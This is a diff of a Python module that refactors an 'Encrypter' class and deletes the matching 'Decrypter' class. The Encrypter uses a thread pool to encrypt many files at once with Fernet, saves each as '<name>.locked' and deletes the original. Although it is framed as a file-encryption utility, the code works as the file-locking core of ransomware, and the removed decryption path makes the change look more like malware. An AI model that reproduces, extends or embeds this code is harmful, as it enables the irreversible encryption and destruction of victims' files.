@@ -8,91 +8,99 @@
 #
 # Licensed under the MIT License.
 # See the LICENSE file in the project root for full license text.
-"""Provides functionality to encrypt and decrypt files using Fernet symmetric encryption."""
 
-import os
+"""Provides functionality to encrypt files using Fernet symmetric encryption."""
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from io import DEFAULT_BUFFER_SIZE, BufferedReader, BufferedWriter
 from pathlib import Path
+from typing import Iterable, Literal
 
 from cryptography.fernet import Fernet
 
-MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)
-
-BYTERODER = "big"
+from utils import MAX_WORKERS
 
 
 class Encrypter:
-    def __init__(self, files: list[Path], fernet: Fernet):
+    def __init__(
+        self,
+        fernet: Fernet,
+        files: Iterable[Path] | None = None,
+        byteorder: Literal["little", "big"] = "big",
+    ):
         self.files = files
         self.fernet = fernet
+        self.byteorder = byteorder
+
+    @staticmethod
+    def validate_buffer(buff_size: int) -> int:
+        """
+        Ensures that the buffer size is between 4KB and 64KB.
+
+        Args:
+            buff_size (int): Desired buffer size in bytes.
+
+        Returns:
+            int: A buffer size constrained to the range [4096, 65536].
+        """
+        MAX_BUFF = 65536
+        MIN_BUFF = 4096
+        return max(MIN_BUFF, min(MAX_BUFF, buff_size))
 
     def _encrypt_stream(
         self,
-        input: BufferedReader,
-        output: BufferedWriter,
-        buff: int = DEFAULT_BUFFER_SIZE,
+        input_stream: BufferedReader,
+        output_stream: BufferedWriter,
+        buff: int = 4096,  # 4kb buff size
     ):
-        while chunk := input.read(buff):
+        """
+        Encrypts data from an input stream and writes it to an output stream in chunks.
+
+        Each chunk is prefixed by its length in bytes, allowing correct decryption later.
+
+        Args:
+            input_stream (BufferedReader): Stream to read plaintext data from.
+            output_stream (BufferedWriter): Stream to write encrypted data to.
+            buff (int, optional): Chunk size in bytes. Will be validated between
+                4KB and 64KB. Defaults to 4096.
+        """
+        buff = Encrypter.validate_buffer(buff)
+        while chunk := input_stream.read(buff):
             enc = self.fernet.encrypt(chunk)
-            output.write(len(enc).to_bytes(4, BYTERODER))
-            output.write(enc)
+            output_stream.write(len(enc).to_bytes(4, self.byteorder))  # type: ignore
+            output_stream.write(enc)
 
     def encrypt_file(self, file: Path, suffix: str = ".locked"):
-        dest = file.parent / (file.name + suffix)
+        """
+        Encrypts a single file and optionally renames it with a suffix.
+
+        After successful encryption, the original file is deleted.
+
+        Args:
+            file (Path): Path to the file to encrypt.
+            suffix (str, optional): Suffix to append to the encrypted file's name.
+                Defaults to ".locked".
+        """
+        dest = file.with_name(file.name + suffix)
         try:
-            with open(file, "rb") as f_in, open(dest, "wb") as f_out:
-                self._encrypt_stream(f_in, f_out)
+            with file.open("rb") as f_in, dest.open("wb") as f_out:
+                self._encrypt_stream(f_in, f_out, buff=DEFAULT_BUFFER_SIZE)
             file.unlink()
         except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
             print(f"Skipping: {file}: {e}")
 
     def encrypt(self):
+        """
+        Encrypts all files provided to the Encrypter instance using a thread pool.
+
+        Files are processed concurrently up to MAX_WORKERS threads. Any exceptions
+        during encryption are caught and logged without stopping the process.
+        """
+        if not self.files:
+            raise ValueError("Files cannot be empty")
+
         with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
             futures = [executor.submit(self.encrypt_file, file) for file in self.files]
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception as e:
-                    print(f"Error: {e}")
-
-
-class Decrypter:
-    def __init__(self, files: list[Path], fernet: Fernet):
-        self.files = files
-        self.fernet = fernet
-
-    def _decrypt_stream(
-        self,
-        input: BufferedReader,
-        output: BufferedWriter,
-        buff: int = DEFAULT_BUFFER_SIZE,
-    ):
-        while 1:
-            size_bytes = input.read(4)
-            if not size_bytes:
-                break  # EOF
-
-            size = int.from_bytes(size_bytes, BYTERODER)
-            chunk = input.read(size)
-            if len(chunk) != size:
-                raise ValueError(
-                    f"Corrupted File: expected {size} bytes, got {len(chunk)}"
-                )
-            dec = self.fernet.decrypt(chunk)
-            output.write(dec)
-
-    def decrypt_file(self, file: Path):
-        dest = file.with_name(file.name.removesuffix(".locked"))
-        try:
-            with open(file, "rb") as f_in, open(dest, "wb") as f_out:
-                self._decrypt_stream(f_in, f_out)
-        except (PermissionError, FileNotFoundError, IsADirectoryError) as e:
-            print(f"Skipping: {file}: {e}")
-
-    def decrypt(self):
-        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-            futures = [executor.submit(self.decrypt_file, file) for file in self.files]
             for future in as_completed(futures):
                 try:
                     future.result()
